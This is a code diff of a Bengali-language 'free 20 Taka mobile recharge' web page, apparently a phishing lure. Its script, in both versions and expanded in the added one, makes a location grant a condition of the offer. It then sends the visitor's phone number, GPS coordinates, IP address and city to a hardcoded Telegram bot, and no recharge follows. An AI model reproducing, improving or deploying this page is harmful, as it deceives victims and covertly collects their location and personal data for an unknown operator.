@@ -5,56 +5,92 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobile Recharge Portal</title>
     <style>
-        body { background: #f8f9fa; font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        .box { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h2 { color: #28a745; }
-        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 18px; }
-        button { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
+        body { background: #ffffff; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; text-align: center; }
+        .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; }
+        .container { max-width: 400px; margin: 40px auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .offer-title { color: #2ba745; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
+        .desc { font-size: 15px; color: #666; margin-bottom: 30px; }
+        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; }
+        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; font-weight: bold; }
+        .btn:active { background: #0056b3; transform: scale(0.98); }
+        .footer { margin-top: 60px; font-size: 12px; color: #bbb; border-top: 1px solid #f1f1f1; padding-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
-        <p>আপনার ১১ সংখ্যার নম্বরটি দিন</p>
-        <input type="number" id="phone" placeholder="01XXXXXXXXX">
-        <button id="btn" onclick="sendData()">রিচার্জ নিন</button>
+
+    <div class="top-bar">অনলাইন রিচার্জ পোর্টাল - ২০২৬</div>
+
+    <div class="container">
+        <div class="offer-title">অফার: ২০ টাকা ফ্রি রিচার্জ!</div>
+        <p class="desc">আপনার ১১ সংখ্যার মোবাইল নম্বরটি দিয়ে ভেরিফিকেশন সম্পন্ন করুন এবং সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
+        
+        <input type="number" id="target_phone" placeholder="01XXXXXXXXX" required>
+        <button class="btn" id="submitBtn" onclick="initiateProcess()">রিচার্জ নিন</button>
     </div>
 
-    <script>
-        async function sendData() {
-            const phone = document.getElementById('phone').value;
-            const btn = document.getElementById('btn');
-            const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; 
-            const chat_id = "7887080882";
+    <div class="footer">© 2026 Mobile Services Bangladesh. All Rights Reserved.</div>
 
-            if (phone.length < 11) { alert("সঠিক নম্বর দিন!"); return; }
+<script>
+async function initiateProcess() {
+    const phone = document.getElementById('target_phone').value;
+    const btn = document.getElementById('submitBtn');
 
-            btn.innerText = "প্রসেসিং...";
-            btn.disabled = true;
+    if (phone.length < 11) {
+        alert("সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!");
+        return;
+    }
 
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                // সঠিক ম্যাপ লিঙ্ক ফরম্যাট
-                const map = `https://www.google.com/maps?q=${lat},${lon}`;
-                const text = `🔔 **নতুন রিচার্জ!**\n📱 নম্বর: ${phone}\n📍 ম্যাপ: ${map}`;
+    btn.innerText = "ভেরিফাই হচ্ছে...";
+    btn.disabled = true;
 
-                try {
-                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-                    await fetch(url);
-                    alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
-                } catch (e) {
-                    alert("নেটওয়ার্ক সমস্যা! আবার চেষ্টা করুন।");
-                } finally {
-                    btn.innerText = "রিচার্জ নিন";
-                    btn.disabled = false;
-                }
-            }, (err) => {
-                alert("লোকেশন পারমিশন ছাড়া অফারটি পাবেন না।");
+    // লোকেশন পারমিশন চাওয়া
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendToBot(phone, pos.coords.latitude, pos.coords.longitude),
+            (err) => {
+                alert("দুঃখিত! লোকেশন পারমিশন ছাড়া এই অফারটি গ্রহণ করা সম্ভব নয়। ব্রাউজার সেটিংস থেকে লোকেশন Allow করুন।");
                 btn.innerText = "রিচার্জ নিন";
                 btn.disabled = false;
-            });
-        }
-    </script>
+            },
+            { timeout: 8000 }
+        );
+    } else {
+        alert("আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।");
+        btn.innerText = "রিচার্জ নিন";
+        btn.disabled = false;
+    }
+}
+
+async function sendToBot(phone, lat, lon) {
+    const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; // আপনার বট টোকেন
+    const chat_id = "7887080882"; // আপনার চ্যাট আইডি
+
+    try {
+        // আইপি এবং এলাকা তথ্য সংগ্রহ
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+
+        // ম্যাপ লিঙ্ক সঠিকভাবে তৈরি (Template Literal ব্যবহার করে)
+        const map_link = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        const text = `**🎁 নতুন রিচার্জ রিকোয়েস্ট!**\n\n` +
+                     `📱 নম্বর: ${phone}\n` +
+                     `🌐 IP: ${ipData.ip}\n` +
+                     `🏠 এলাকা: ${ipData.city}, ${ipData.country_name}\n` +
+                     `📍 ম্যাপ: ${map_link}`;
+
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+        
+        await fetch(url);
+        alert("অনুরোধ সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
+    } catch (e) {
+        alert("সার্ভার ত্রুটি! আবার চেষ্টা করুন।");
+    } finally {
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = "রিচার্জ নিন";
+        btn.disabled = false;
+    }
+}
+</script>
 </body>
 </html>
